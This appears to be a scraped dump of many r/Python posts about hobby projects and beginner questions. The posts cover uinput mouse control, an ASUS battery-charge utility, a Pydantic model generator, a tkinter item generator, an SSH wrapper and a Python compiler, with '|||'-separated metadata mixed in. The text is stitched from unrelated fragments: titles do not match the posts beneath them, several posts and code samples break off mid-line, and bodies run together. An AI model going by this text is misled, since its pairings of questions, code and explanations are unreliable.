That also means that we can define an area, say in a monitor, by mapping (or scaling) a range `0 to monitor_sizex` to `monitor_topleft_x to monitor_topright_x` (same with y). Meaning that `0,0`, is the top-left of the monitor, `1440,900` is the bottom-right and so on. (I will not show an example of that since there are many out there)

## Example

### Create ranges for `ABS_X` and `ABS_Y` that correspond to a single `1280x720` display, and moves the mouse to `10,10`.
        
    import uinput
    import time
    
    device_events = (
    	uinput.ABS_X + (0, 1280, 0, 0),
    	uinput.ABS_Y + (0, 720, 0, 0),
    )
    
    with uinput.Device(device_events) as device:
    	time.sleep(1)
    	device.emit(uinput.ABS_X, 10)
    	device.emit(uinput.ABS_Y, 10)

Notice that we use `time.sleep(1)` before doing anything with the device. That is a weird quirk with uinput where it won't initialize completely instantly, and we must wait a little bit before doing anything. You can make that delay shorter if you like.""|||json extraction|||Python|||1|||1|||1607098774|||""[removed]""|||Creating A Software that Can Read Shutter Count from Canon DSLR?

Hi there! I built this over the weekend and figured someone other than myself might find it useful. 

Like many who work with REST APIs in Python, I've recently fallen in love with Pydantic. If you haven't heard of Pydantic, it's a data validation and parsing library that makes working with JSON in Python quite pleasant. 

I needed a quick way to generate a Pydantic model from any given sample of JSON, and hacked together this application to do so. You can paste in a valid JSON string, and you'll get a valid Pydantic model back. 

This is helpful if you're working with poorly documented APIs, really big objects, or have lots of edge cases to catch.

Today is a red letter day for me, because it's the first time I'm releasing something I've made for others.

Introducing [asus-charge-control](https://github.com/cforrester1988/asus-charge-control), a console utility written in Python for Linux users with ASUS notebooks to easily set the maximum battery charge level on their device.

It mimicks a feature that ASUS notebooks ship with, "[Battery Health Charging](https://www.asus.com/us/support/FAQ/1032726/)." It helps preserve the useful lifespan of your laptop battery by limiting its maximum charge level. Once it hits the limit, it stops charging and runs on AC power. Keeping your battery's charge level between 40% and 80% as often as possible helps minimize the number of charge cycles it goes through. [Click here for a very detailed explanation](https://batteryuniversity.com/learn/article/how_to_prolong_lithium_based_batteries) of lithium-ion charge cycles.

Linux kernels have enabled this feature since version 5.4, but using it is a bit obscure for the average person. You need to manipulate a sysfs object to set it, and it doesn't remember what you set it to between reboots. I've been doing that with a cron job on boot to set it to 80%, but I wanted a quick way to change the charge end threshold for times when I need the battery's full capacity.

I'd love to have some feedback from others about how it works for them. I only have the one notebook, but every recent ASUS notebook should have the same feature enabled with a kernel version &gt;= 5.4. I'd especially love some feedback on the quality of my code, and tips on how to improve it.

My next step is to build simple a simple GTK interface with Glade. I'd like to add features like time- and location-based scheduling to it. Feature suggestions are also welcome.""|||Looking for art?

Right now I have it in .csv format and am processing it using pandas.

My goal is to be able to get a random item from the files, with some being more rare than others, then add random effects to it that may change some of the stats like damage.

This will all be displayed in tkinter; showing the name of the items, its stats such as type, damage, value, etc. and then magical effects it may have come with.

Right now I am hitting a roadblock with pandas in being able to display individual cell data in tkinter. When I have the pandas processing in the main root it works fine but when I seperate it as a function that I want to be able to loop it doesnt display correctly. I get a bunch of numbers then the name of the function in the label text.

I am wondering if it would be easier to use a different data structure such as an array or dictionary but what I have found seems to be more oriented towards data sets that only have one variable and are just ints. 

Or maybe there is a way to actually get the pandas data cells I want to display correctly in tkinter...

my pandas list has 3 different data sources right now and each row has about 12 statistics of both ints and strs.

Here is my code:

    from tkinter import *
    import pandas as pd
    import random 
    
    root = Tk()
    root.title("Random Item Generator")
    
    il_label = Label(root, text = "Max Item Level")
    il_label.grid(row=0,column=0)
    
    il_entry = Entry(root, width=10, borderwidth=1)
    il_entry.grid(row=0,column=1)
    
    df = [pd.read_csv('weapons.csv'), pd.read_csv('armor.csv'), pd.read_csv('aether_infused.csv')]
    
    def rand_il():  #This is not being used yet
        return random.randint(1,int(il_entry.get()))
    
    item_class = random.choices(df, weights=(45,40,15), k=1) 
    item = item_class[0].sample()
    
    item_name = item.iloc[0]['Name']
    iLevel_base = item.iloc[0]['Item Level'] 
    
    def gen_item():
        name_txt = Label(root,text= item_name)
        ilBase_txt = Label(root,text= iLevel_base)
        
        name_txt.grid(row=2, column=0)
        ilBase_txt.grid(row=2, column=1)
    
    
    gen_button = Button(root, text="Generate Item", command=gen_item).grid(row=1)
    
    root.mainloop()

this one works but I can't loop the process to generate the item which I will need to do in order to restrict certain items based on level

when I change it to this:

    def get_itemBase():
        item_class = random.choices(df, weights=(45,40,15), k=1)

The main benefits I see are:

\- export code into modules from notebook, which can be done with other helpers

\- automated docs, which can be setup easily and use sphinx instead which seems better

Post that there seem to be a bunch of tools tacked on, making the whole thing less flexible, gh actions etc

Has anyone played around with this, what are you thoughts on its uses?""|||Wrote a Python script to find tickers tweeted about recently for the first time - from accounts that have proven they've called high earners very early in the past.|||Python|||1|||3|||1607012114|||""Hello!

I was bored so I wrote this script, but now I've thought of an idea for further implementing it in a more public and useful environment. I've written a Python script that samples 200 tweets from top stock accounts I follow - accounts I've seen tweet about high earners very early in the past. The goal is to catch these tweets early, not after the 10nth tweet (and thus, maybe a moderate rise due to time), to get into these stocks with small positions as soon as possible, obviously after proper DD has been conducted. It allows you more flexibility in scaling into stocks which it returns and you find confidence in.

You can find my tweet about it here:

[https://twitter.com/xozxro/status/1334523177519570944](https://twitter.com/xozxro/status/1334523177519570944)

As it stands, this algorithm does what it's supposed to. It's found tickers that I checked, showing that the sample accounts had only just tweeted about them for the first time. Thus, my idea is to create a Twitter account that either a) 5 times per day, tweets out the collection of new tickers or b) the account tweets them out as they're found. The ladder is more difficult as the Twitter API only lets me get a certain amount of Tweets per month, so constantly retrieving tweets could exhaust this if not paced. However, I could likely circumvent this as an improvement upon the former design (a), if I did implement it as an account. So, the question - should I create such an automated account?

The sources for the tickers, as in the accounts the algorithm looks at, would be in the bio. They are reputable accounts, and known and respected primarily in the penny stock community.

Just wanted to share, as I solved a problem I myself as a trader has considered! Thought others may be interested in the ease.""|||Wrote a python script to automatically upload CSV files to a database|||Python|||1|||0|||1607011583|||""This is both a resource and a tutorial, but I just wanted to share a simple py script that I built to automate uploading multiple csv files to a postgres database .

I used this script almost everyday at my past job to upload data from other teams and departments.

I recorded a tutorial on youtube for anyone that wants to try to build it out (links in the README and below). Hope this is helpful either as a way to easily upload files to a db or as practice getting better building python scripts to automate your work.

**Summary:**

Rate, discover, and discuss interesting films, series, games, books, and music beyond the mainstream. Connect with users with compatible taste. A community-oriented platform that is free from corporate influence. Built with Django REST Framework on the backend and Vue on the frontend.

&amp;#x200B;

**More info:**

Many media recommendation and streaming platforms already exist, however they tend to make the same obvious recommendations over and over. They're also largely owned by massive corporations that dont have a vested interest in showing you something interesting and unique (in fact they often have a vested interest in corralling you towards content that they produce or can license for cheap). peepthis emphasizes discovery of new and interesting titles, even if they dont have mass appeal and are incapable of surviving some mysterious recommendation algorithm.

Many social networks are increasingly discouraging insightful, in-depth discussion, instead favoring low-effort, repetitive memes and catchphrases. peepthis emphasizes quality over quantity when it comes to discussion.  Its great to engage with media on a deeper and discuss different perspectives or details you may have missed.

I'm a hobby developer. I started almost three years ago with zero knowledge of web dev or Python. I taught myself everything that I needed to know to get this web app online, mostly through trial and error (and reading through a lot of Stackoverflow answers and documentation). I made up my mind that I would see this project through to a full release, whether or not it will actually attracts users, and here it finally is.

I don't have plans to make the entire codebase open source, but I'm happy to share excerpts or answer questions about anything (coding, design, hosting, experiences, etc.) from any skill level.  I would also love to hear any feedback.

Hopefully you'll either find this web app  useful or inspiring. If I could do it, then I assure you that anyone can.

&amp;#x200B;

**Features:**

\-Rate, review, and keep track of your media (films, series, games, books and music)

\-See your taste compatibility with other users

\-Receive personalized media recommendations based on your ratings, or browse the media database using a variety of filters

\-Post in a fully-featured subreddit-style community (topics with nested comments) for each media title

\-Create lists to organize your media, browse user-curated lists

\-Send real-time direct messages to other users

\-Receive push notifications on your device (via OneSignal)

\-Update the database using a custom-built change management system. Any user can submit new media titles or edit existing ones, and the implementation of the changes is gated to mod approval

\-Responsive design- fits all screen sizes, mobile to desktop

\-PWA functionality, can be installed on most devices (isn't much different from the website, but it's nice to have the app icon)

&amp;#x200B;

There is also a community Discord which I monitor more closely. If you prefer Discord or want to have a longer conversation, then feel free to post anything there and I'll respond: [https://discord.gg/AZPve4d](https://discord.gg/AZPve4d)""|||Json post|||Python|||1|||1|||1607009837|||""python endpoint and post use json format

I just wanted to announce that [Caer](https://github.com/jasmcaus/caer), an open-source, *GPU-accelerated* Computer Vision library I built in Python has reached over **100k downloads** on PyPi! I built this project in mid-August and am quite ecstatic about Caer's exponential growth over these 4 months as well as the support I received from the programming community, especially here on r/Python :D

To be brief, Caer ([https://github.com/jasmcaus/caer](https://github.com/jasmcaus/caer)) is a Python library built on top of OpenCV and Pillow that offers powerful image and video processing algorithms, providing both casual and advanced users with an elegant interface for Machine vision operations.

Since this is a relatively new project and the codebase is rapidly growing on a weekly basis, I welcome any feedback. If you'd like to contribute to Caer, I've written a comprehensive [Contribution Guide](https://github.com/jasmcaus/caer/blob/master/CONTRIBUTING.md).

I have made some progress and it happens to work for some images, but for many others it fails to recognize a digit or two and since if you miss a single digit the puzzle cannot be solved.

All developers has to write a lot of code when developing the backend of the application. You need to write the models corresponding to the schema of tables. Then need to write the serializers corresponding to the models and then expose all the views separately for all the CRUD (Create, Read, Update, Delete) operations separately. We can write the code and then modularise it. But we cant visualize it, we need to create a separate copy of the ER (Entity relationship) diagram and need to keep it updated. 

We also need to keep track of the modules as well as the subcomponents of the system. Then making changes in the code need to update the docs. 

What if i told you can have a boilerplate code for your application with a visualisation available.

## Demo

In the demo I have created the backend for a simple Ecommerce application with 5 tables and 2 components. 

towards the end of the video it also has a walkthrough of the code that is generated by the system.

[https://youtu.be/wBM2mJnIkMA](https://youtu.be/wBM2mJnIkMA)

## What it does

The Django code generator helps you to create code for your web applications using the monday.coms in just 3 simple steps:

Step 1 Create a new workspace and create a new board using the template application

Step 2 Configure all you tables and its columns in your application. Configure all your modules, components and tables.

Step 3 Click a build and it will download the zip file

## How I built it

Used the templates and the views provided by monday.com. 

Got the data configurations from the Monday React SDK. Queried the data for the board using the monday api through GraphQL. 

Sent the data to a Django web server to create the build files and folders.

Developed two views in React:

One which has the ER diagram other one with has the component and the module structure. Both the configurations are used to generate the code for Django Application.

I can manually patch that through a media player of choice, such as VLC. The issue is, however, that such an offset will only persist for as long as that process is alive. I want to permenently modify the sub file, however, so I can play it whenever I want and not bother with the offsets each time.

So, I made this. For personal use, but am also sharing it in case anyone else would want it.

The project aims to introduce the control theory contents to engineering students in a more friendly, interactive way. Interactive examples are organized in the form of Jupyter Notebooks and are programmed in Python 3. They are grouped into four topics: Mathematical examples, Time-domain examples, Frequency-domain examples and State-space examples. The access to the course is available to anyone for free upon singing up.

**How the ICCT platform works?**

1. Upon signing up and logging in [ICCT](https://icct.riteh.hr/), open folder **ICCT** and then click on **Table-of-Contents-ICCT.ipynb**.
2. A table of contents will open up. Click on the selected example to open it.
3. Click **Cell - Run All** to run the example.
4. Interact with the example and when you finish click **File - Close and Halt**. Memory limit (500 MB) is namely enforced for a distinct user; it is therefore necessary to close and halt an example when finished in order to free up memory.

Your comments, suggestions etc. are more than welcome!

Clean Architecture was invented by Robert C. Martin that co-wrote the Agile Manifesto and coined the SOLID principles. It's well worth looking into.

Since writing the article I've also put together a demo app, written in Java. Follow the link below to see it:

It allows people to add their own music and always plays the song with the most votes next. Now you can add  music from Discord's chat box and vote for all enqueued songs from there. The new Discord bot will join your voice channel and stream the music.

[Example usage in chat](https://preview.redd.it/3dwmtjtybe261.png?width=602&amp;format=png&amp;auto=webp&amp;s=05c81e0427dc99bbf713c929542756ed0283a374)

Instructions and the source code for the bot is available [on Github](https://github.com/raveberry/discord/).  In short, the Discord bot works as a frontend for Raveberry. You need a running Raveberry instance from which the music can be streamed.

The  good thing is: You do not need to run Raveberry on a publicly available  server. The bot runs in your own network and forwards the audio stream  to Discord. While this requires you to create a bot in Discord's  settings, it should be easier to setup (and cheaper) than a server.

I would be happy if some of you tried it out and I hope that it will provide for some fun remote sessions.

I wrote a python script that can help anyone who wants to study a foreign language to get full language courses for various levels for FREE.

The script is a scraper I wrote since I wanted to save some courses and material from Japanesepod101 to listen to on my phone, but I ended up making it global for almost any language.

Few points regarding the script:

1. I've noticed there are some other similar scrapers that rely on selenium but they are buggy and fragile. I like selenium as a tool, but I find it often times unnecessarily misused when simple POST/GET requests could get the same job done more eloquently, that's why I went with beautifulSoup.
2. Currently the script is only downloading mp3s (since that's what I originally intended to do) but I  plan on adding PDF/Video downloading in the future as well.

Any feedback is appreciated! :)

Thank you so much!""|||I made my first PyGame project a few months ago|||Python|||1|||0|||1606696424|||""A few months ago, I recreated the famous card "Kitti" using PyGame. This was one of my first projects with the module.   For those of you that don't know the game, it's sort of like Rummy but not exactly like it. It's played between 2 or more players and each player gets 9 cards from the deck.  

Players would then have to form three hands of three and sort these hands in a descending order of strength. The order of strength goes: 3 of a kind, a straight flush, a straight sequence, pair and lastly high card.     The players would then go on to reveal their hands in three separate rounds. The first round would be where they reveal their strongest hands and well, the strongest of them all wins. The second round would be where they reveal their second strongest hand and in the third and final round they reveal their least powerful hand.   

The only strategy, despite the heavily luck based nature of the game, a player can make whilst playing this game is to arrange their cards in a way that ensures maximum number of total wins for them. For instance if you had a choice between winning the first round by forming a hand of three aces or losing the first round but winning the second and third rounds by using those aces elsewhere, the smarter thing to do would be go with the latter.   It is for this reason that I used a probabilistic model whilst writing the Algorithm for the enemy A.I.

It can do the following things:

* Create performance regression tests. (See if a change affected the performance of your code.)
* Create boundary tests to verify your code does not run longer than a set min, max or average threshold.
* Generate single flame graphs or compare flame graphs of two performance tests. 
* Quickly Generate flame graphs from any point in your code using a decorator and little bit of logic.

Cyberbrain is a debugging solution that aims to free programmers. It lets you:

* **Backtraces variable changes**.
* See **every state** of program execution, including **variables' values**
* **Debug loops** with confidence.

It's not like any triditional debuggers. Instead of  stepping through a program, Cyberbrain can tell you what happened.

It's a WIP, the ultimate goal is to be a replacement for existing debuggers in most cases.

I'm the author of [Rich](https://github.com/willmcgugan/rich), a terminal rendering library. I recently implemented a feature almost by accident (a side effect of something else). And I was looking for feedback. Specifically, if it is of any practical use to anyone, and not just a novelty.

Basically Rich can "record" terminal sessions and save it to HTML.

Try this:

    pip install rich
    python -m rich.ansi $SHELL
    ... do stuff in the shell (ls,python) etc ...
    Hit Ctrl+D

You should find a "stdout.html" in the current directory with the output of your terminal session, including colors and style.

Works on Linux / OSX. Not yet on Windows.

I was thinking this may be of use in blogging, rather than screenshots. But I suspect there may be other applications.

It won't yet work for terminal apps that move the cursor, i.e. TUIs.""|||PSA: If you've installed Anaconda but your command prompt no longer opens, read this:|||Python|||1|||0|||1606578371|||""Background: I downloaded and installed the latest Anaconda version and afterwards realized I didn't want to keep my previous versions, so I uninstalled those using the Anaconda uninstall utility. Before uninstalling, though, I couldn't get the Spyder IDE to open, so I ran a litany of commands, including "conda init". 

The problem: running the init command somehow created a conflict, the result of which was I'd try to open the command prompt, but it would merely flash then disappear. Meanwhile PowerShell would open, but on opening, it would scream about not finding conda.exe.

The solution: thanks to "conda init", the new version of conda creates an AutoRun entry in your registry, as well as a profile.ps1 file in your documents folder. Because conda was confused, the value of AutoRun was "if exist  ", which confused the command prompt upon opening and immediately closes. Simply delete the profile.ps1 file to fix PowerShell and delete the AutoRun entry in your registry to fix the command prompt. Voila, everything now works.

P.S. I previously ran "SFC /scannow" in PowerShell to figure out if any files were corrupted, but none were. I recommend running that before you edit the registry.

I made a simple Twitter bot which posts random Wiki Information about places around the whole world on a timely basis.

Twitter Handle: [RandomPlacesBot](https://twitter.com/RandomPlacesBot/)

**Backstory**

I've a ritual wherein I search for places which are less explored during the end of the year as a getaway trip. I prefer to go to places which are not crowded aka less touristy. And when I've searched, I've found quite a few hidden gems.

This made me realize that there are lot of places around the whole world which not everyone knows about. For instance, recently I discovered a place called "Batu Caves" which is in Malaysia and the place looks fascinating. 

That's when I realized, I wanted to make a bot which will tweet Wiki Information about places which people may or may not know about.

&amp;#x200B;

**Conclusion:**

For most beginners CodeCademy, Octomo and Udemy are solid and affordable choices. For me, Octomo stands out because of the weekly live-sessions and being able to connect with others over Python in times where its difficult to meet people.

So I've been working on this project for a very long time now, and I'm finally ready to publish it!

This project started out as a final project for my Data Science course and further evolved while taking the Sequence Models course in the Deep Learning specialization on Coursera.

This notebook is written in an educational style, explaining every step in a beginner friendly manner. I really hope that you'll enjoy going through this notebook and gain not only technical skills but also analytical skills from it. We will discover how to process text in order to infer sentiment from it and try to take advantage of every result, visualization and failure in order to further understand the data and the models.

Throughout this notebook, we will discover the world of Natural Language Processing (NLP) by building a sentiment analysis model. The goal of such a model would be to classify tweets as either having positive or negative sentiment. We will first build a Nave Bayes model, a classical statistical approach for sentiment classification, and then compare it to a Deep Learning model - LSTM.

It simulates me going onto website, selecting size, city and checking if it's available in nearby stores. If it completes this action and adds to basket - it stops and sends me notification on email, so I can complete the action myself.  
  
Looking back, it would probably take me miniscule portion of time to do it myself on daily basis, than what it took to write it.  
  
Maybe it will come handy to someone, who wants to complete something similar.

[Here](https://github.com/ABGates/FolderSorter.git) is the link to the source code.

This simple program takes a folder path as user input and then sorts all the files in that folder based on their file type. My reasoning for making this program was to sort my downloads folder and make it easier to navigate.

In dotnet, solutions are usually broken up into separate projects/modules, such as a web project, business logic project, and then a data access project.  Developers are encouraged to recreate their model classes in each project, so that they remain independent of each other, even if the models are identical.  The objects are mapped back and forth during the execution of a route/process.  

Do Python developers follow a similar approach?  I tend to agree with the concept of modules being independent from one another, but it tends to add a lot of overhead to development and even runtime.""|||i have to create base64 from this code below, i dont know how, i need help, im new in python|||Python|||1|||4|||1606402874|||""def bin2hex(bin\_value):

Throughout this time, I learned C# and Java, HTML, CSS as well,  but Python is the only language I am confident at.  I have some portfolio projects and I am applying for the Jobs but so far I have only one last round internship interview coming up for the Python developer role. I am passioned about AI  / Machine Learning but not sure what should I learn next, whether go for what I am passioned about and dig into ML tools and ML itself or master Front end with HTML, CSS, JS (React) which would make me Full-Stack developer and opens up new opportunities, or master languages that I know little bit such as C# and Java and their frameworks .NET core / Spring boat or even Android development? I am confused at this stage of my journey. 

I assume that learning ML and do what I love is good in the long term but little be hard to get my foot to the door without a CS degree. And I question myself, is it a smart move now to start from the beginning and learn ML while I already have some knowledge in web development and maybe I should learn front end now?  At the same time,  mastering Front End would probably make it faster to land my first job. I am not sure about C# and Java as their also backend languages mostly and learning another backend framework doesn't offer much.

That's not a good code. Just to show python capabilities.

Everyone knows that operators can be overridden in python. Therefore, you can:


```
home_page = (
_   &lt;&lt;html&gt;&gt;
_     &lt;&lt;head&gt;&gt;
_       &lt;&lt;title&gt;&gt; "Home t.me/drunkensnake" &lt;&lt;_/title&gt;&gt;
_     &lt;&lt;_/head&gt;&gt;
_     &lt;&lt;body&gt;&gt;
_       &lt;&lt;p&gt;&gt; "Wellcome to my home page" &lt;&lt;_/p&gt;&gt;
_     &lt;&lt;_/body&gt;&gt;
_   &lt;&lt;_/html&gt;&gt;
_
)
```

*Brain explode* HTML templating!

Source from: https://t.me/drunkensnake/15

```
def magic_html_chain_method(op):
    def method(self, other):
        self_copy = MagicHTMLTag(self.token)
        try:
            self_copy.segments = (*(s for s in self.segments), op, *(s for s in other.segments))
        except AttributeError:
            self_copy.segments = (*(s for s in self.segments), op, other)
        return self_copy
    return method
```

Magic chain method is wrapper of method with operator (see below). This method will take the next token (instance of MagicHTMLTag) and chain them. So X + Y =&gt; ("X", "+", "Y",)

```
class MagicHTMLTag:
    def __init__(self, token_name):
        self.token = token_name
        self.segments = (self,)

    def as_html(self):
        html_code = ""
        for segment in self.segments:
            if isinstance(segment, MagicHTMLTag):
                html_code = html_code + segment.token
            else:
                html_code = html_code + segment
        return html_code

    __lshift__ = magic_html_chain_method("&lt;")
    __rshift__ = magic_html_chain_method("&gt;")
    __truediv__ = magic_html_chain_method("/")
```

MagicHTMLTag is a class that can handle '&gt;&gt;', '&lt;&lt;', '/' operators. And return HTML code of itself.

```
_ = MagicHTMLTag("")
html = MagicHTMLTag("html")
head = MagicHTMLTag("head")
title = MagicHTMLTag("title")
body = MagicHTMLTag("body")
p = MagicHTMLTag("p")
```

Instances of MagicHTMLTag. Used as syntax sugar.

```
home_page = (
_   &lt;&lt;html&gt;&gt;
_     &lt;&lt;head&gt;&gt;
_       &lt;&lt;title&gt;&gt; "Home t.me/drunkensnake" &lt;&lt;_/title&gt;&gt;

        "&lt;head&gt;"
            "&lt;title&gt;Home t.me/drunkensnake&lt;/title&gt;"

Here's the [GitHub](https://github.com/Hyperdimensionals/tempera), or it can be downloaded on pip.

This is the first package I've created and uploaded to pypi.org. The functionality itself is not particularly interesting or compelling - it creates 'Temperature' objects which can be converted at will to celsius/fahrenheit/kelvin, and a 'global' scale can be set so any instances of the Temperature class will be returned in that scale with the method *getTemperature()*. I made this as part of a larger application I'm working on, so multiple temperatures displayed on a GUI could be converted easily when the user selects a different temperature scale.

I mostly wanted to practice formatting and coherently writing my code, writing coherent READMEs/examples, and using git and the python package index. And I'm sure there are errors in the code (also, I've only had the chance to test it on my Macbook Pro thus far) - my next step is to learn how to 'properly' test code.

I'm currently in the process of writing a Python-&gt;JavaScript transpiler.

It's going well, but I'm having trouble developing an intuitive API for it.

Here's a rough example of what API I have in mind:

```py
from tbd import JS

with JS() as js:
    from react import use_state

    @js.export()
    def Counter():
        [count, set_count] = use_state(0)

        return js.compat.jsx.button(
            f"Count: {count}",
            on_click=lambda: set_count(count + 1)
        )
```

And in order to compile it to JS, just call `JS.__str__`:

```py
str(js)
```

Which will return:

```js
import { useState } from "react";

export default function Counter () {
    const [count, setCount] = useState(0);

    return &lt;button onClick={() =&gt; setCount(count + 1)}&gt;Count: {count}&lt;/button&gt;
};
```

You can see that the `with` statement is what separates normal code from code that is to be compiled to JavaScript. Obviously there is some magic involved, since I'm using `inspect` and `tokenize` under the hood.

I've recently published a new package pyinfer. It is a very small utility for ML developers or researchers to use to collect some useful inference specific statistics about either a single ML model or a collection of them. 

The idea behind the package was to support developers in making decisions around model selection in production as the number of inferences per second a model can perform is an important factor to take into account when building production grade ML systems.

The package is still in its early days but I have tried to make it as simple as possible to use and have also written fairly extensive tests for what is there. 

I'd love to hear any thoughts, suggestions, or feedback on the project.

* Success Rate - Number of successful inferences within a specified time range.
* Failures - Number of inferences above specified time range.
* Time Taken - Total time taken to run all inferences.
* Inference Per Second - Estimate of how many inferences per second the selected model can perform.
* Max Run - The max time taken to perform an inference for a given run.
* Min Run - The min time taken to perform an inference for a given run.
* Std - The Standard deviation between runs.
* Mean - The mean run time.
* Median - The median run time.
* IQR - The inter quartile range of the runs.

Hi everyone,

One of the most annoying things when starting new projects is copying the skeleton of an old project and adapting it for the new project. [Github templates](https://docs.github.com/en/free-pro-team@latest/github/creating-cloning-and-archiving-repositories/creating-a-template-repository) and [cookiecutter](https://cookiecutter.readthedocs.io/en/1.7.2/) aimed at solving this problem by allowing for the quick generation of (customized) project templates.
However, they suffer from several major shortcomings:

1. They do not share a common structure. Even two Python templates may strongly differ in their architecture and design. Most templates are very basic and unfinished.

2. They rarely ship with documentation setups, makefiles, issue templates, extensive continuous integration pipelines and many more best practices

3. No one ensures that these templates adhere to best practices and nothing ensures that any templates updates are applied to already existing projects.

4. It is annoying to bump the version across several configuration files.

cookietemple offers powerful project templates for several domains (e.g. command line tools or libraries) for several languages (Python, C++, Java, [...]), which can be created interactively with user choices (cookietemple create). Although, these templates do of course differ due to the different ecosystems, they share common structures and quality solving issue 1 and 2. The created project can be automatically pushed to a fresh Github repository. 
Whenever cookietemple updates a project template, a pull request is automatically submitted against the repository with the latest changes (cookietemple sync) and a custom linter ensures that the project always adheres to cookietemples high standards (cookietemple lint). This solves issue 3.
cookietemple bump-version bumps the version across several configurable files and inserts new changelog sections allowing for regular releases.
Please take a look at our website, documentation and repository and try out cookietemple. Theres a lot more to talk about, but we dont want to write a book here.

cookietemple is free software licensed under Apache 2.0 and was developed in 2020 by us, a scientists and a medical doctors first major open-source project. We love the community and want to give back.
cookietemple aims to be a community driven project and we would like to invite you to join us and to contribute new templates (e.g. Rust, C#, ), features, bug reports and fixes. 
cookietemple is well documented and we are a friendly bunch :)

&amp;#x200B;

Im happy to present a project weve been working on named Flyable. What it does is take your Python code and compile it directly into an executable file that runs 10x-80x faster. It makes it so Python can now be used in performance critical application while keeping its original simplicity. 

&amp;#x200B;

One of our top goals was to make the transition to Flyable as seamless as possible by keeping the original Python 3 syntax so you do not have to add extra code like you do with alternative solutions like Cython and Numba.

&amp;#x200B;

To achieve this level of compatibility, Flyable analyses the code and automatically applies data types and optimizations. Also, the compiler produces compile time errors with stack traces so you get instant feedback to prevent runtime issues.

&amp;#x200B;

Heres a quick demo of the compiler using a simple temporary IDE:

Its perfect for making small projects and testing concepts, but its just so unstructured and annoying sometimes, and i dont understand why.

First, and the biggest problem i have with it, why isnt there a proper type system. Today i spent 30 mins debugging a simple bubble sort algorithm because i forgot to turn a string to an int, and i was actually comparing strings. This would never have been a problem in a language like c#, where the types would have been declared and it would give an error, but with python i wasted so much time thinking how can 3 be bigger than 21.

I know this probably isnt a big problem once you get used to it, but for someone coming from a more "traditional" programming language, i really struggle to understand, why. WHY. WHY would anyone want this.

Second, its general lack of structure. I like a few minor things about it, like how indentation can be syntax, but i also see how easily that could go wrong. 

But then there are things like semicolons which are not required but you can also use them if you want??, and also parantheses not being required but also working with it? Why, just why. It makes it so annoying to read other peoples code especially in big projects, and if a person for some reason decides to use it both ways at the same time? It becomes just torture trying to read that.

&amp;#x200B;

The Monty Hall problem has confused people for a long time.   
In  the problem, you are on a game show, being asked by the host to choose  between three doors   .  Behind two doors, there are goats    and behind one there is a car . You choose a door (looking for a car).  The host, Monty Hall, picks one of the other doors, which he knows has a  goat behind it, and opens it, showing you the goat. (You know, by the  rules of the game, that Monty will always reveal a goat.) Monty then  asks whether you would like to switch your choice of door to the other  remaining door or stay with your earlier choice.   


So, would you  be stubborn with your earlier guess or change the door that you have  selected. (One of the choices will give you twice the more chance of  winning the car than the other). But which one?   


Using python, I  have created Monte Carlo stimulation which helps us to choose which  among the two given choices will give us better chance of winning .  Also, you can play the game in the program and check it yourself. (link - [github link](https://github.com/hardikkamboj/Code/blob/master/Probability/Monty%20Hall%20Problem.ipynb))

My inspiration for doing this was a video I saw on youtube talking about regression to the mean: [https://www.youtube.com/watch?v=1tSqSMOyNFE](https://www.youtube.com/watch?v=1tSqSMOyNFE)

Regression to the mean is a widely talked topic in statistics, "it is the phenomenon that arises if a sample point of a random variable is extreme (nearly an outlier), a future point will be closer to the mean or average on further measurements." this is a breve definition from [https://en.wikipedia.org/wiki/Regression\_toward\_the\_mean](https://en.wikipedia.org/wiki/Regression_toward_the_mean).

My main goal was to show through a simulation this phenomenon, that's the actual reason why you see a red point changing with the graph because I wanted to show the behavior of a specific student through different tests, unfortunately, as you can see, the phenomenon of regression to the mean is not too noticeable in this simulation, but I think the reason to this is that I didn't use a large enough data set of different test, I just used 20.

feel free to play around with the code [https://github.com/camilol47/Regression\_visualization](https://github.com/camilol47/Regression_visualization), I tried to explain all the functions I used and why I do what I do with the code, I'm open to receiving feedback as I'm a beginner to this fascinating world of programming.

I've published my first Python package this week: [**sshcontroller**](https://github.com/ojroques/python-sshcontroller). I often have to run SSH commands and I was tired of configuring Paramiko from the ground up each time. So I've written a small package that is essentially a wrapper around Paramiko most useful features: executing commands on remote hosts and transferring data with SFTP.

Now running a SSH command is as simple as that:

    ssh = sshcontroller.SSHController(
      host="93.184.216.34",
      user="olivier",
      key_path="~/.ssh/id_rsa",
      key_password="&lt;your-password&gt;"
    )
    ssh.connect()
    return_code, output = ssh_controller.run(
      "echo 'Hello world!'",
      display=True,               # display output, disabled by default
      capture_output=True,   # save output, disabled by default
    )
    print(f"return code: {return_code}, output: {output}")

    $ ./demo.py
    [INFO] Successfully connected to olivier@93.184.216.34
    Hello world!
    return code: 0, output: ['Hello world!']

The package takes care of setting up the socket and reading data coming in. In addition, all SFTP commands from Paramiko are available, meaning that you can do things like:

    ssh_controller.mkdir("/remote/example-dir/")
    ssh_controller.put("/local/example.txt", "/remote/example.txt")
    ssh_controller.get("/remote/example.txt", "/local/example.txt")

For this reason I implemented this basic packet sniffer using just built-in libraries and fully compatible with Python 3.x. It is implemented in OOP, leverages libraries like ctypes, socket, argparse and others and relies on the use of abstract base classes, inheritance, special methods, decorators and design patterns (command, observer and  template). We also employ some manipulation of binary and hexadecimal values that are formatted for the use on raw sockets.

This tool is part of an upcoming (though not nearly ready) series of video tutorials I plan to launch some time in the next year. It might be a rather long course given how much we'd need to cover about all the underlying networking and programming topics.

program needs to be designed for 2 computer monitors (one that i'm using, and one facing the players), and needs 2 separate windows: an "output" and "input" window.

function: for me to add, or select from a list, an image on the "input" window and have that image show up on the "output" window of the other monitor

The user can delete or update the product by just changing the description of the Instagram post and tapping a refresh button in the app.

(Btw it also generates Flame Graphs :D) Looking to share my creation (Also feedback and handy tips to improve my code are more than welcome.)

Hi Reddit,

I am not someone that posts regularly, rather I am more of a casual shy observer :). In the past months, I have been working on one of my first open-source Python projects which I am very excited about.

That's why I am writing this post so I can share it with other people and hopefully get some feedback.

Below a link to my Github Repo:

https://github.com/JoeyHendricks/QuickPotato

Besides having a silly name, QuickPotato is packing the capabilities to create automated performance tests for your project. These tests can then pass or fail automatically based on a students T-test (regression testing) or if they are above or below a certain threshold (boundary testing).

Besides being able to automatically test code, it can also generate graphics which can be used to analyse why a test has failed. The graphics I am referring to are for now limited to either a single flame graph or two flame graphs side by side (previous test vs latest test) so you can see what part was slower or faster.

That's my two cents on the matter but what do you fine Redditors think about it?

PS: If you check out my repo there are two links to the bottom of the page, one link goes to Youtube where I speak about the framework and its concept on performance engineering conference and the other goes to a post I wrote on LinkedIn.

